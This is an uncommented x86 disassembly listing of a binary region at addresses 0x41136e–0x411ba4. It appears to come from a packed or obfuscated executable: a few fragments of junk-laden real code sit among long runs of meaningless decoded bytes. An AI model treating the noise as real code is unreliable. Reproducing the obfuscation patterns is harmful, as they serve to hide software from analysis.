  41136e:	imul   esi,DWORD PTR [edi-0x216fe60],0xab8fcad1
  411378:	stc    
  411379:	xor    dl,BYTE PTR [eax]
  41137b:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  41137f:	mov    edx,DWORD PTR [ebp+0xc]
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx-0x2302a05f],ecx
  4113db:	xor    DWORD PTR [ecx],eax
  4113dd:	inc    eax
  4113de:	jle    0x41145e
  4113e0:	icebp  
  4113e1:	jg     0x411461
  4113e3:	jle    0x411438
  4113e5:	out    dx,eax
  4113e6:	repnz xchg edi,eax
  4113e8:	xchg   edx,eax
  4113e9:	inc    edx
  4113ea:	jnp    0x41146a
  4113ec:	inc    ecx
  4113ed:	retf   0x4677
  4113f0:	xchg   ebp,eax
  4113f1:	jle    0x411436
  4113f3:	(bad)  
  4113f4:	icebp  
  4113f5:	outs   dx,BYTE PTR ds:[esi]
  4113f6:	sub    eax,0x8c04df40
  4113fb:	stc    
  4113fc:	ret    
  4113fd:	ds adc eax,0xeae40e3
  411403:	dec    esp
  411404:	loop   0x4113dd
  411406:	push   edi
  411407:	out    0x94,eax
  411409:	clc    
  41140a:	adc    ecx,DWORD PTR [ecx]
  41140c:	mov    bl,0x92
  41140e:	(bad)  
  41140f:	adc    eax,0x27763d84
  411414:	lahf   
  411415:	call   FWORD PTR [edx]
  411417:	jno    0x4113c4
  411419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41141a:	jo     0x4113c6
  41141c:	pop    edi
  41141d:	add    eax,0xe35f56bb
  411422:	ja     0x411452
  411424:	lods   al,BYTE PTR ds:[esi]
  411425:	mov    esi,0x6bc9384d
  41142b:	lods   al,BYTE PTR ds:[esi]
  41142c:	inc    edx
  41142d:	out    0xcc,eax
  41142f:	clc    
  411430:	sbb    bh,BYTE PTR [ebx+0x76]
  411433:	mov    dl,0x7b
  411435:	dec    esi
  411436:	mov    eax,0xbff8e68
  41143b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41143c:	jle    0x4113f1
  41143e:	cld    
  41143f:	mov    bl,0x92
  411441:	jl     0x411417
  411443:	fs ss pop dx
  411447:	scas   al,BYTE PTR es:[edi]
  411448:	outs   dx,DWORD PTR ds:[esi]
  411449:	push   esp
  41144a:	out    dx,al
  41144b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41144c:	pop    ecx
  41144d:	scas   al,BYTE PTR es:[edi]
  41144e:	push   ds
  41144f:	pop    edi
  411450:	and    bh,BYTE PTR ds:0x3729d4ff
  411457:	sub    eax,0x94c51df4
  41145c:	out    0x1c,eax
  41145e:	iret   
  41145f:	push   edx
  411460:	adc    ebx,DWORD PTR [edi+0x78b5ad62]
  411466:	sub    eax,0x74d28bea
  41146b:	adc    dh,BYTE PTR [ecx]
  41146d:	(bad)  
  41146e:	xor    al,0x79
  411470:	loopne 0x4114dd
  411472:	xchg   ecx,eax
  411473:	pusha  
  411474:	(bad)  
  411475:	(bad)  
  411476:	in     al,dx
  411477:	xchg   edi,eax
  411478:	mov    DWORD PTR [eax+0x74],esi
  41147b:	mov    BYTE PTR [edx-0x3480dea7],ch
  411481:	mov    esi,0x66cb8387
  411486:	or     al,0xfe
  411488:	inc    esi
  411489:	sbb    esp,DWORD PTR [eax]
  41148b:	ss sub cl,al
  41148e:	jle    0x4114ff
  411490:	loop   0x411460
  411492:	les    esi,FWORD PTR [eax-0x3ee825e2]
  411498:	cmp    edx,DWORD PTR [ecx+0x76]
  41149b:	cmp    al,0xd6
  41149d:	xor    BYTE PTR [edx-0x167ec3dd],0x16
  4114a4:	add    dh,al
  4114a6:	in     al,0x28
  4114a8:	das    
  4114a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114aa:	fst    st(5)
  4114ac:	mov    al,ds:0xcc26f55e
  4114b1:	jg     0x41152d
  4114b3:	xchg   DWORD PTR [ebx],ebx
  4114b5:	mov    eax,ds:0xa5a2ee0d
  4114ba:	cmp    eax,0x35f701f0
  4114bf:	adc    ebp,DWORD PTR [edi-0x38]
  4114c2:	xchg   esi,eax
  4114c3:	outs   dx,DWORD PTR ds:[esi]
  4114c4:	push   es
  4114c5:	or     al,0x5d
  4114c7:	jg     0x4114f4
  4114c9:	add    BYTE PTR [ebx+0x31],dh
  4114cc:	push   ebx
  4114cd:	mov    edx,0x3e2c5811
  4114d2:	xchg   ecx,eax
  4114d3:	ficom  WORD PTR [eax*4-0x4667fd19]
  4114da:	push   ecx
  4114db:	inc    ebp
  4114dc:	sub    esp,ebx
  4114de:	fisub  DWORD PTR [ebp-0x74ae39ec]
  4114e4:	pop    ebp
  4114e5:	lock aaa 
  4114e7:	push   edi
  4114e8:	xchg   BYTE PTR [ecx-0x43be0c48],bl
  4114ee:	sbb    dh,BYTE PTR [eax]
  4114f0:	(bad)  
  4114f1:	nop
  4114f2:	out    dx,al
  4114f3:	sbb    DWORD PTR fs:[edx+0x38fadb90],eax
  4114fa:	pop    ds
  4114fb:	or     BYTE PTR [esi],dl
  4114fd:	imul   ebx,DWORD PTR [eax],0xffffffe7
  411500:	lock sbb al,0x56
  411503:	(bad)  
  411504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411505:	stos   DWORD PTR es:[edi],eax
  411506:	(bad)  
  411507:	adc    al,al
  411509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41150a:	sbb    cl,BYTE PTR [esi]
  41150c:	sahf   
  41150d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41150e:	jle    0x411494
  411510:	mov    esp,0x64854526
  411515:	cmp    al,0x16
  411517:	inc    edi
  411518:	dec    edi
  411519:	outs   dx,BYTE PTR ds:[esi]
  41151a:	imul   BYTE PTR [ecx]
  41151c:	adc    BYTE PTR [edx-0x71],cl
  41151f:	add    DWORD PTR [esi+0x7950076f],esp
  411525:	xchg   esi,eax
  411526:	pop    ebp
  411527:	mov    ds:0x3d903218,al
  41152c:	loop   0x4114f5
  41152e:	shl    BYTE PTR [ebp+0x4a],0x89
  411532:	jns    0x411520
  411534:	push   edi
  411535:	dec    ecx
  411536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411537:	push   ebx
  411538:	mov    al,0x36
  41153a:	inc    esi
  41153b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41153c:	xchg   ecx,eax
  41153d:	imul   ebx,DWORD PTR [ebx],0xffffffe0
  411540:	(bad)  
  411541:	mov    eax,ds:0xac658172
  411546:	stc    
  411547:	(bad)  
  411548:	out    0xdc,eax
  41154a:	leave  
  41154b:	and    eax,0xdbcc62e1
  411550:	stc    
  411551:	sti    
  411552:	inc    esi
  411553:	jne    0x41157b
  411555:	fwait
  411556:	or     BYTE PTR [edx+0x203c85f2],0x20
  41155d:	je     0x411545
  41155f:	jae    0x411541
  411561:	jp     0x411564
  411563:	inc    DWORD PTR [ebp+0xc]
  411566:	jmp    0x4111ca
  41156b:	mov    eax,DWORD PTR [ebp-0x10]
  41156e:	xor    eax,ecx
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	dec    esi
  411582:	lahf   
  411583:	int3   
  411584:	jne    0x411506
  411586:	inc    ecx
  411587:	jle    0x411607
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x4115ac
  41158e:	dec    eax
  41158f:	std    
  411590:	xor    BYTE PTR cs:[edx-0x12],ch
  411594:	adc    ecx,ebp
  411596:	pushf  
  411597:	jle    0x411540
  411599:	lock xor eax,0xc0b14395
  41159f:	loopne 0x4115d4
  4115a1:	jge    0x4115bf
  4115a3:	aas    
  4115a4:	retf   0x9730
  4115a7:	(bad)  
  4115a8:	shl    eax,1
  4115aa:	cmp    BYTE PTR [ecx+0x78c84942],0xdb
  4115b1:	xchg   ecx,eax
  4115b2:	test   DWORD PTR [eax],esp
  4115b4:	or     DWORD PTR [esi+ebx*4+0x23cf35a],ecx
  4115bb:	sub    esp,ecx
  4115bd:	push   esp
  4115be:	mov    eax,es:0xd2c68cc
  4115c4:	mov    dh,0xbc
  4115c6:	adc    DWORD PTR [ebx+0x6a9a5571],edi
  4115cc:	mov    ebx,0x92d48536
  4115d1:	dec    esi
  4115d2:	out    0xc5,eax
  4115d4:	inc    ecx
  4115d5:	xor    DWORD PTR [eax+0x7f],ebp
  4115d8:	mov    edx,0x5c4ef931
  4115dd:	cdq    
  4115de:	stos   BYTE PTR es:[edi],al
  4115df:	pop    esp
  4115e0:	add    ah,bl
  4115e2:	push   edi
  4115e3:	adc    al,0x1a
  4115e5:	mov    DWORD PTR [eax],ebp
  4115e7:	xor    ebp,DWORD PTR [eax]
  4115e9:	popa   
  4115ea:	xchg   esi,eax
  4115eb:	test   eax,0xbfc063eb
  4115f0:	imul   esp,esp,0x26
  4115f3:	mov    al,ds:0x504e1586
  4115f8:	ror    ch,cl
  4115fa:	fs and al,0x66
  4115fd:	lea    ebp,[ebx]
  4115ff:	gs aas 
  411601:	inc    edx
  411602:	je     0x411623
  411604:	lods   eax,DWORD PTR ds:[esi]
  411605:	loop   0x41159c
  411607:	rcr    DWORD PTR [edi],cl
  411609:	pushf  
  41160a:	jge    0x411600
  41160c:	sti    
  41160d:	push   edi
  41160e:	mov    cl,BYTE PTR [eax-0x6c]
  411611:	(bad)  [ebx-0x34]
  411614:	fidivr WORD PTR [eax]
  411616:	xchg   ebp,eax
  411617:	sub    BYTE PTR [edx],ch
  411619:	ret    
  41161a:	jns    0x4115f3
  41161c:	mov    edi,0x2e38d611
  411621:	jmp    0x14c3:0x59b5e96
  411628:	clc    
  411629:	lds    edi,FWORD PTR [ebp+ecx*2-0x21]
  41162d:	enter  0x3dfe,0x13
  411631:	add    ah,dl
  411633:	ss pusha 
  411635:	lahf   
  411636:	sub    dl,BYTE PTR [ecx+0x3ea84352]
  41163c:	fcmove st,st(3)
  41163e:	or     al,0xca
  411640:	jns    0x41164f
  411642:	fstp   DWORD PTR [edi+0x729b8b62]
  411648:	out    0xb2,al
  41164a:	das    
  41164b:	mov    esp,0x9643eaf2
  411650:	jne    0x411633
  411652:	push   ecx
  411653:	(bad)  
  411654:	pop    esp
  411655:	fisub  WORD PTR [esi]
  411657:	(bad)
  41165a:	mov    eax,0x8b6a5c42
  41165f:	push   es
  411660:	je     0x411669
  411662:	mov    ch,0xac
  411664:	or     ebx,DWORD PTR [esi+0x43]
  411667:	leave  
  411668:	cld    
  411669:	lea    edx,[ecx+0x4b5f609]
  41166f:	mov    ebp,0xf6fd4449
  411674:	pop    edi
  411675:	xchg   edi,eax
  411676:	sbb    DWORD PTR [edi+0x53],eax
  411679:	inc    ebp
  41167a:	mov    eax,0xa59f48c2
  41167f:	repz (bad) 
  411682:	mov    BYTE PTR [eax-0x56],dl
  411685:	push   eax
  411686:	and    BYTE PTR [edi-0x36],dl
  411689:	mov    dl,0x27
  41168b:	ja     0x4116c2
  41168d:	stos   BYTE PTR es:[edi],al
  41168e:	add    bl,BYTE PTR [esp+eiz*8-0x1f]
  411692:	icebp  
  411693:	ret    
  411694:	addr16 jo 0x4116f7
  411697:	adc    bl,BYTE PTR [esi+0x215f193]
  41169d:	sbb    esi,DWORD PTR [ebx+0x2b]
  4116a0:	repz pushf 
  4116a2:	mov    esp,0x575d8cca
  4116a7:	faddp  st(3),st
  4116a9:	sub    edx,ebx
  4116ab:	test   BYTE PTR [eax-0x61],bh
  4116ae:	xchg   esp,eax
  4116af:	sub    DWORD PTR [edi-0x67a0effd],ebx
  4116b5:	jns    0x4116a0
  4116b7:	add    DWORD PTR [esi+ebp*8+0x68fd52ed],esi
  4116be:	ret    
  4116bf:	sbb    ebp,DWORD PTR [esi-0x5ba31857]
  4116c5:	(bad)  
  4116c6:	outs   dx,DWORD PTR ds:[esi]
  4116c7:	repz cld 
  4116c9:	add    BYTE PTR [ebx+0x236e743b],dh
  4116cf:	xchg   edi,eax
  4116d0:	(bad)  
  4116d1:	or     eax,0x9e0851d5
  4116d6:	sbb    eax,0xe7454a1f
  4116db:	cs ds fwait
  4116de:	(bad)  
  4116df:	cwde   
  4116e0:	add    BYTE PTR [edx+0x430b379c],ah
  4116e6:	inc    ebp
  4116e7:	dec    eax
  4116e8:	daa    
  4116e9:	push   edx
  4116ea:	scas   eax,DWORD PTR es:[edi]
  4116eb:	dec    ebp
  4116ec:	sub    edi,DWORD PTR [edi-0x1e]
  4116ef:	or     BYTE PTR [eax],bl
  4116f1:	mov    ds:0x64c8dfa0,al
  4116f6:	adc    edx,DWORD PTR [ecx+edi*8+0x2e82c4fe]
  4116fd:	xchg   DWORD PTR [ebp+0x41],esi
  411700:	ret    
  411701:	std    
  411702:	push   edi
  411703:	inc    ebx
  411704:	adc    al,0x2
  411706:	mov    ecx,DWORD PTR [eax]
  411708:	fwait
  411709:	xor    al,0x7c
  41170b:	call   0x89c6:0x3104d8b
  411712:	add    DWORD PTR [esi-0x37],ebx
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4337ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4337fb,0x4337c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433803,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43382b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4337bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x8df7718
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x4117da
  41178e:	clc    
  41178f:	outs   dx,DWORD PTR ds:[esi]
  411790:	dec    ebx
  411791:	loope  0x41176a
  411793:	ret    
  411794:	retf   0xf1dd
  411797:	sub    eax,0x68beeee9
  41179c:	mov    BYTE PTR ds:0x77da9052,al
  4117a2:	ins    BYTE PTR es:[edi],dx
  4117a3:	mov    dl,0x96
  4117a5:	test   si,sp
  4117a8:	rcl    ebp,1
  4117aa:	je     0x411730
  4117ac:	lds    eax,FWORD PTR [esi-0x4a]
  4117af:	xor    BYTE PTR [eax-0x53],dl
  4117b2:	mov    edi,0x23ce1e7
  4117b7:	jb     0x411788
  4117b9:	xchg   ecx,eax
  4117ba:	mov    bh,0xdf
  4117bc:	les    eax,FWORD PTR [ecx-0x66]
  4117bf:	xchg   esi,eax
  4117c0:	div    ebx
  4117c2:	mov    esp,0xa7ac50ea
  4117c7:	repz fnstenv [eax+0xa]
  4117cb:	mov    ds:0xe6badf94,eax
  4117d0:	sub    al,0xcf
  4117d2:	call   0x965f:0x65a3cb0e
  4117d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117da:	mov    bh,0x51
  4117dc:	sub    ah,BYTE PTR [ebp-0x46f1b21e]
  4117e2:	shr    ch,1
  4117e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e5:	xor    BYTE PTR [edx+0x4bf92e2c],ah
  4117eb:	scas   al,BYTE PTR es:[edi]
  4117ec:	mov    al,0x9a
  4117ee:	(bad)  [esi]
  4117f0:	leave  
  4117f1:	inc    ebp
  4117f2:	ins    BYTE PTR es:[edi],dx
  4117f3:	mov    al,0x7c
  4117f5:	gs aas 
  4117f7:	push   ecx
  4117f8:	xor    al,0xe4
  4117fa:	adc    ah,ch
  4117fc:	clc    
  4117fd:	pop    edx
  4117fe:	sbb    DWORD PTR [eax+0x44cb86aa],0x22aadef0
  411808:	mov    ebx,0x9eb951bb
  41180d:	pusha  
  41180e:	scas   eax,DWORD PTR es:[edi]
  41180f:	mov    dl,0xec
  411811:	mov    eax,0x7042dd6e
  411816:	mov    al,0xad
  411818:	mov    esi,0x8a20470c
  41181d:	mov    cl,0x33
  41181f:	mov    ch,BYTE PTR [ecx+ecx*8+0x5aee1550]
  411826:	fs fwait
  411828:	inc    ebx
  411829:	mov    ah,0x2
  41182b:	inc    esi
  41182c:	(bad)  
  41182e:	repnz das 
  411830:	mov    dl,0x41
  411832:	bound  ebp,QWORD PTR [esi+0x35]
  411835:	stos   BYTE PTR es:[edi],al
  411836:	inc    eax
  411837:	mov    ecx,0xdefe5214
  41183c:	xor    BYTE PTR [esi-0x3cb4209d],cl
  411842:	aas    
  411843:	jae    0x41182f
  411845:	mov    ebp,0x92559e6
  41184a:	cld    
  41184b:	pop    esi
  41184c:	adc    esp,DWORD PTR [edx+0x2b15c067]
  411852:	sbb    ah,ah
  411854:	mov    ds:0x4ddcef1,eax
  411859:	mov    bh,BYTE PTR [edx+esi*1+0x18016f95]
  411860:	iret   
  411861:	gs aam 0xc5
  411864:	cmc    
  411865:	loopne 0x411809
  411867:	mov    ah,0xff
  411869:	dec    edi
  41186a:	adc    eax,0x633dfb94
  41186f:	aam    0xc3
  411871:	out    0x98,eax
  411873:	into   
  411874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411875:	bnd jp 0x4118dc
  411878:	mov    edx,0xdb856150
  41187d:	popa   
  41187e:	test   DWORD PTR [edx-0x307a8eaa],ecx
  411884:	sub    eax,0x2cf442c2
  411889:	fsubp  st(7),st
  41188b:	or     ah,dl
  41188d:	in     al,dx
  41188e:	imul   DWORD PTR [edi+0x9c3ae5]
  411894:	es sbb eax,0x48c092b7
  41189a:	nop
  41189b:	aad    0x2f
  41189d:	push   esi
  41189e:	mov    ebp,0x9352bd3d
  4118a3:	fnstenv [ecx+edi*4+0x42c06430]
  4118aa:	cmp    al,0xa1
  4118ac:	aad    0x24
  4118ae:	bound  esp,QWORD PTR [ebp+ebx*8-0x71d777b4]
  4118b5:	sub    bh,BYTE PTR [edx-0xcd4621f]
  4118bb:	and    dl,cl
  4118bd:	push   edi
  4118be:	jne    0x411858
  4118c0:	add    cl,BYTE PTR [ebp+0x5439a9c3]
  4118c6:	jp     0x41187a
  4118c8:	sbb    BYTE PTR [ebx+0x4c],cl
  4118cb:	push   0x1e2ce793
  4118d0:	fist   DWORD PTR [eax]
  4118d2:	repnz into 
  4118d4:	adc    BYTE PTR [edi-0x4f],0x3c
  4118d8:	nop
  4118d9:	inc    ebp
  4118da:	mov    edi,0x4f006c6d
  4118df:	or     BYTE PTR [edi-0x685065b0],0xdc
  4118e6:	mov    bl,0xa3
  4118e8:	sub    ebp,eax
  4118ea:	xchg   DWORD PTR [eax+0x4255454c],esi
  4118f0:	stos   BYTE PTR es:[edi],al
  4118f1:	fcmovu st,st(6)
  4118f3:	jg     0x411905
  4118f5:	test   BYTE PTR [edx+eiz*4],al
  4118f8:	mov    ds:0x60be2691,eax
  4118fd:	fs jmp esi
  411900:	je     0x4118a6
  411902:	mov    esi,0x6a95d1cb
  411907:	or     ecx,DWORD PTR [edx+0x5bb909f0]
  41190d:	std    
  41190e:	jg     0x411935
  411910:	cmp    eax,0xaeb1fec4
  411915:	jnp    0x411992
  411917:	ins    DWORD PTR es:[edi],dx
  411918:	pop    ecx
  411919:	pop    ds
  41191a:	sub    edx,edi
  41191c:	add    eax,0xac3c346a
  411921:	fdiv   st(0),st
  411923:	jg     0x4118ba
  411925:	adc    eax,0x97b2b32f
  41192a:	add    ecx,edx
  41192c:	imul   DWORD PTR [ecx+0x0]
  41192f:	hlt    
  411930:	xchg   ecx,eax
  411931:	dec    ebp
  411932:	fs out dx,eax
  411934:	sbb    edi,DWORD PTR [esi+0x22d8f26f]
  41193a:	int    0xad
  41193c:	xor    ch,BYTE PTR [eax]
  41193e:	cmp    bl,BYTE PTR [edi+0x74]
  411941:	jmp    0x4747:0xbc37c6ac
  411948:	(bad)  
  411949:	sbb    eax,0x3645334d
  41194e:	sbb    al,0x49
  411950:	push   esi
  411951:	idiv   edi
  411953:	fsubr  st,st(0)
  411955:	out    0x34,eax
  411957:	(bad)  
  411958:	rcl    DWORD PTR [esi+0x42992846],1
  41195e:	int    0xaf
  411960:	cmp    ch,BYTE PTR [edx]
  411962:	sbb    al,0x1c
  411964:	add    eax,0x25ab179e
  411969:	les    eax,FWORD PTR [edx-0xe]
  41196c:	out    dx,eax
  41196d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41196e:	int3   
  41196f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411970:	loope  0x41191e
  411972:	xchg   edi,eax
  411973:	lods   al,BYTE PTR ds:[esi]
  411974:	xor    eax,0xed0783c8
  411979:	sub    al,ch
  41197b:	cmp    al,0xfe
  41197d:	scas   eax,DWORD PTR es:[edi]
  41197e:	xchg   esi,eax
  41197f:	xchg   esp,eax
  411980:	cmp    ebp,ebx
  411982:	imul   ebx,DWORD PTR [esi+0x62b8caf],0x7e
  411989:	sub    ebp,DWORD PTR [edi-0x30]
  41198c:	loop   0x411968
  41198e:	sub    eax,esi
  411990:	hlt    
  411991:	iret   
  411992:	das    
  411993:	dec    ecx
  411994:	test   esi,edi
  411996:	cld    
  411997:	in     al,0x40
  411999:	sub    BYTE PTR [esi],bl
  41199b:	add    DWORD PTR [eax*1+0x2615ee28],eax
  4119a2:	call   0x5108b094
  4119a7:	add    BYTE PTR [esp+eiz*4-0x68],dl
  4119ab:	add    ecx,DWORD PTR [eax+0x3c]
  4119ae:	or     DWORD PTR ds:0x433723,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433827,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433827
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433827,eax
  4119d6:	cmp    DWORD PTR ds:0x433827,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433827,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x25
  411a13:	test   eax,0x4d2579dc
  411a18:	jle    0x411a98
  411a1a:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411a1e:	pop    es
  411a1f:	inc    ebx
  411a20:	dec    ecx
  411a21:	(bad)  
  411a22:	imul   ebx,DWORD PTR [edi-0x305e224e],0xfffffff7
  411a29:	outs   dx,DWORD PTR ds:[esi]
  411a2a:	rol    ecx,cl
  411a2c:	mov    edi,0x1104be21
  411a31:	shl    BYTE PTR [ebx+edi*4+0x34],0xc0
  411a36:	sbb    BYTE PTR [edx+ecx*8-0x51dd0785],cl
  411a3d:	ins    DWORD PTR es:[edi],dx
  411a3e:	add    DWORD PTR ds:0xd1faa624,0xffffffe4
  411a45:	fldcw  WORD PTR [ebx-0x5522a7a0]
  411a4b:	pop    ebx
  411a4c:	sysenter 
  411a4e:	shl    BYTE PTR [ebp+0x6281cf7c],0xfe
  411a55:	jg     0x4119e6
  411a57:	mov    ecx,0x8bd923be
  411a5c:	sbb    BYTE PTR [eax+0x7d10fa53],0xf5
  411a63:	and    edi,DWORD PTR [ebp-0xa]
  411a66:	add    eax,0x80012709
  411a6b:	test   BYTE PTR [esi+0x561b8481],bh
  411a71:	es popf 
  411a73:	xchg   edi,eax
  411a74:	inc    edi
  411a75:	add    esp,DWORD PTR [esi+0x6fa72d61]
  411a7b:	mov    eax,ds:0xbb9b0234
  411a80:	xchg   BYTE PTR [ecx+0x50],al
  411a83:	or     eax,0xe777a926
  411a88:	shl    DWORD PTR [esi+eax*2],1
  411a8b:	(bad)  
  411a8c:	push   edi
  411a8d:	ret    
  411a8e:	xor    eax,DWORD PTR [ebx+0x56]
  411a91:	mov    bl,0xe3
  411a93:	mov    bh,0x18
  411a95:	repz sbb al,0x14
  411a98:	dec    edi
  411a99:	hlt    
  411a9a:	(bad)  [edi+0x4a]
  411a9d:	int3   
  411a9e:	mov    bh,0xda
  411aa0:	test   al,0xa8
  411aa2:	enter  0xea3b,0x40
  411aa6:	outs   dx,BYTE PTR ds:[esi]
  411aa7:	pop    es
  411aa8:	and    ah,BYTE PTR [ebx]
  411aaa:	stos   BYTE PTR es:[edi],al
  411aab:	pop    ecx
  411aac:	or     bl,dh
  411aae:	lods   al,BYTE PTR ds:[esi]
  411aaf:	cmp    al,0x3b
  411ab1:	mov    esi,0x205e92cc
  411ab6:	mov    eax,0x1d824539
  411abb:	jmp    0x411b38
  411abd:	lds    esp,FWORD PTR [esi+0x27]
  411ac0:	xchg   edi,eax
  411ac1:	pop    ebp
  411ac2:	mov    al,ds:0xb275fa74
  411ac7:	(bad)  
  411ac8:	out    0xd2,al
  411aca:	hlt    
  411acb:	adc    esi,DWORD PTR [edi+0x5274306a]
  411ad1:	jmp    0x8987:0x8818517c
  411ad8:	pushf  
  411ad9:	push   edx
  411ada:	and    al,0x81
  411adc:	out    dx,eax
  411add:	adc    al,0x1f
  411adf:	mov    edx,0xd6f13b19
  411ae4:	and    bh,bh
  411ae6:	push   eax
  411ae7:	loope  0x411b35
  411ae9:	dec    esi
  411aea:	fisubr WORD PTR [edi+0x6d]
  411aed:	jo     0x411b1a
  411aef:	sbb    ah,BYTE PTR ds:0xb48625ff
  411af5:	(bad)  
  411af6:	push   0x3c9ffe6a
  411afb:	jns    0x411b24
  411afd:	pop    edi
  411afe:	and    BYTE PTR [edx-0x2cb57f25],cl
  411b04:	jmp    0x9d96:0xe026b987
  411b0b:	jl     0x411b36
  411b0d:	fmul   QWORD PTR [ebx+0x73b242ef]
  411b13:	lods   al,BYTE PTR ds:[esi]
  411b14:	call   0x76e9e5be
  411b19:	imul   ebp,DWORD PTR [edx],0xffffff9a
  411b1c:	push   ebx
  411b1d:	sub    al,0x49
  411b1f:	adc    cl,BYTE PTR [esi+0x786e0565]
  411b25:	cs dec ebx
  411b28:	push   esi
  411b29:	fst    DWORD PTR [ebx+0xc9b5ec6]
  411b2f:	sub    DWORD PTR [ebp-0x68],0xffffff93
  411b33:	xchg   cl,al
  411b35:	inc    ebp
  411b36:	ficomp WORD PTR [edx-0x6c]
  411b39:	loopne 0x411b80
  411b3b:	mov    ds:0x6c83d021,al
  411b40:	and    BYTE PTR [ebx+0x42],bl
  411b43:	icebp  
  411b44:	call   0xf3f6:0xf37eced4
  411b4b:	cdq    
  411b4c:	and    al,bl
  411b4e:	adc    ah,bh
  411b50:	jae    0x411b06
  411b52:	cli    
  411b53:	cmp    al,0x55
  411b55:	call   0xe008190
  411b5a:	int3   
  411b5b:	push   eax
  411b5c:	xchg   edi,eax
  411b5d:	mov    ecx,DWORD PTR [ebx+0x16c28e1d]
  411b63:	or     bh,BYTE PTR [ecx+0x3e]
  411b66:	out    dx,al
  411b67:	fs push ecx
  411b69:	dec    esp
  411b6a:	aad    0x8e
  411b6c:	(bad)  
  411b6d:	cwde   
  411b6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b6f:	cmp    bh,bh
  411b71:	fcmove st,st(7)
  411b73:	cmp    eax,DWORD PTR [edi+ebp*4+0x34]
  411b77:	fsubr  QWORD PTR [eax-0x79dd3a79]
  411b7d:	jmp    0x411b85
  411b7f:	sbb    BYTE PTR [edx-0x790f420a],bh
  411b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b86:	cmp    eax,ebx
  411b88:	inc    ecx
  411b89:	jge    0x411b80
  411b8b:	and    esi,esi
  411b8d:	dec    ebp
  411b8e:	inc    esp
  411b8f:	xchg   DWORD PTR [edi-0x6d],edi
  411b92:	cmp    eax,0x1700192c
  411b97:	div    esi
  411b99:	rol    eax,cl
  411b9b:	pop    ebx
  411b9c:	cmp    dh,bl
  411b9e:	push   ecx
  411b9f:	adc    al,0xf9
  411ba1:	cmp    dh,al
  411ba3:	scas   al,BYTE PTR es:[edi]
  411ba4:	mov    esi,DWORD PTR [eax-0x47]
